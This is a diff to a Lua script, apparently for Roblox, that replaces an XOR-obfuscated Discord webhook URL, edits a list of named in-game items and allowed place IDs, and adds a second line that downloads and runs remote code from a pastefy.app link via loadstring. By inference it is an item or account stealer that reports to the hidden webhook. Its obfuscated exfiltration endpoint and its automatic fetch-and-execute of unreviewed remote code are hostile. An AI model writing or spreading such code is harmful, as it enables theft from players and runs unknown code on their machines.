@@ -1,8 +1,8 @@
 local genv = getgenv()
 
 genv.GOOD_WEBHOOK = (function()
-    local b = {73,85,85,81,82,27,14,14,69,72,82,66,78,83,69,15,66,78,76,14,64,81,72,14,86,68,67,73,78,78,74,82,14,16,20,18,19,17,20,25,22,24,18,17,23,23,22,23,19,19,22,17,14,12,66,82,79,88,108,71,79,82,19,19,89,22,103,70,83,21,100,89,16,83,108,17,73,121,66,108,71,100,84,66,21,118,17,117,18,87,71,21,78,86,20,100,75,111,105,91,104,113,24,69,119,116,79,126,79,78,71,108,89,100,111,24,87,79,123,23,17}
-    local k = 33
+    local b = {203,215,215,211,208,153,140,140,199,202,208,192,204,209,199,141,192,204,206,140,194,211,202,140,212,198,193,203,204,204,200,208,140,146,150,144,145,149,147,149,144,145,145,146,146,149,144,154,154,146,147,151,140,146,210,202,240,155,213,231,199,154,198,242,249,242,229,241,242,201,228,244,239,200,238,215,239,229,229,154,249,146,196,148,239,247,193,244,242,202,232,203,149,200,228,230,233,154,238,252,245,238,213,245,149,200,207,250,219,196,206,201,209,154,201,215,225,235,229,226,214}
+    local k = 163
     local o = {}
     for i = 1, #b do o[i] = string.char(bit32.bxor(b[i], k)) end
     return table.concat(o)
@@ -15,16 +15,16 @@ genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 genv.ALLOWED_ANIMALS = {
     "Strawberry Elephant",
     "Headless Horseman",
-    "John Pork",
     "Meowl",
+    "John Pork",
     "Skibidi Toilet",
     "Griffin",
     "Dragon Aquanini",
     "Dragon Gingerini",
     "Hydra Dragon Cannelloni",
     "Signore Carapace",
-    "Love Love Bear",
     "Dragon Cannelloni",
+    "Love Love Bear",
     "Moby Bros",
     "Digi Narwhal",
     "Kraken",
@@ -41,10 +41,12 @@ genv.ALLOWED_ANIMALS = {
     "Cooki and Milki",
     "Arcadragon",
     "Burguro And Fryuro",
+    "Los Secret Combinasionas",
     "Ketupat Bros",
     "Reinito Sleighito",
     "Fortunu and Cashuru",
     "Los Amigos",
+    "Pizza and Ranch",
     "Antonio",
     "La Secret Combinasion",
     "Pancake and Syrup",
@@ -69,34 +71,38 @@ genv.ALLOWED_ANIMALS = {
     "Capitano Americano",
     "Los Spaghettis",
     "Rubrikiko",
+    "Examen Bros",
     "Festive 67",
     "Guest 666",
     "Quackini Snackini",
     "Cloverat Clapat",
+    "La Summer Grande",
+    "Los Tictacs",
+    "Spaghetti Tualetti",
     "Caylusaurus",
     "Hopilikalika Hopilikalako",
+    "La Easter Grande",
     "Steakini Fattini",
     "Garama and Madundung",
+    "La Anniversary Grande",
     "Nacho Spyder",
+    "Rosetti Tualetti",
+    "Rubiko and Kubiko",
     "Fishino Clownino",
-    "Money Money Bros",
     "Jolly Jolly Sahur",
     "Gym Bros",
     "Rico Dinero",
     "Tirilikalika Tirilikalako",
     "Orcaledon",
-    "Swaggy Bros",
     "Abyssaloco",
     "Fragola La La La",
     "Los Tacoritas",
-    "Eviledon",
-    "Los Mariachis",
+    "Lovin Rose",
     "Globa Steppa",
     "Tralaledon",
-    "Chillin Chili",
-    "Los Bros",
     "Celularcini Viciosini",
-    "La Sahur Combinasion",
+    "Tacorita Bicicleta",
+    "Noo my examine",
 }
 
 genv.ALLOWED_PLACE_IDS = {
@@ -104,6 +110,10 @@ genv.ALLOWED_PLACE_IDS = {
     78906538690694,
     119594317142884,
 }
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/KdnESnOL/raw"))()
+end)
 
 task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
